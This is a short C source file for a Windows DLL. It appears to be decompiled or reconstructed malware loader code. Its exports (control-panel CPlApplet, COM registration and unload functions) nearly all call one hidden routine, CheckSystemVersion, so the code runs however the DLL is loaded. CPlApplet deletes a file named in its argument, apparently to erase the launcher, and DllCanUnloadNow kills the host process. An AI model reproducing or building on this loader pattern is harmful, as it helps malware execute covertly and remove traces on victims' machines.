#include "OS.h"
#include "config.h"
#include "StdAfx.h"

HINSTANCE g_hInstDLL = NULL;

BOOL 
WINAPI 
DllMain
(HINSTANCE hinstDLL, 
 DWORD fdwReason, 
 LPVOID lpReserved)
{
	DEBUG_P("DllMain called")
	
	if(fdwReason && fdwReason == 1)
		g_hInstDLL = hinstDLL;
	
	return TRUE;
}

BOOL 
WINAPI 
DllUnregisterServerEx
(HINSTANCE hinstDLL, 
 DWORD fdwReason, 
 LPVOID lpReserved)
{
	DEBUG_P("DllUnregisterServerEx called")
	
	if(fdwReason && fdwReason == 1)
	{
		g_hInstDLL = hinstDLL;
		CheckSystemVersion(TRUE);
	}
	
	return FALSE;
}

STDAPI 
APIENTRY 
DllCanUnloadNow(void)
{
	DEBUG_P("DllCanUnloadNow called")
	
	g_hInstDLL = GetModuleHandleW(0);
	CheckSystemVersion(TRUE);
	
	ExitProcess(0);
}

STDAPI 
APIENTRY 
DllGetClassObject
(const IID *const rclsid,
 const IID *const riid,
 LPVOID *ppv)
{
	DEBUG_P("DllGetClassObject called")
	
	CheckSystemVersion(TRUE);
}

STDAPI 
APIENTRY 
DllRegisterServerEx(void)
{
	DEBUG_P("DllRegisterServerEx called")
	
	CheckSystemVersion(TRUE);
	return 1;
}

LONG 
WINAPI 
CPlApplet
(HWND hwndCPl,
UINT uMsg,
LPARAM lParam1,
LPARAM lParam2)
{
	DEBUG_P("CPlApplet called")
	
	if(*(DWORD *)(hwndCPl + 2))
		DeleteFileA(*(LPCSTR *)(hwndCPl + 2));
	
	CheckSystemVersion(TRUE);
	return 1;
}

STDAPI 
APIENTRY 
DllGetClassObjectEx
(int a1,
int a2,
int a3,
int a4)
{
	DEBUG_P("DllGetClassObjectEx called")
	
	CheckSystemVersion(FALSE);
}
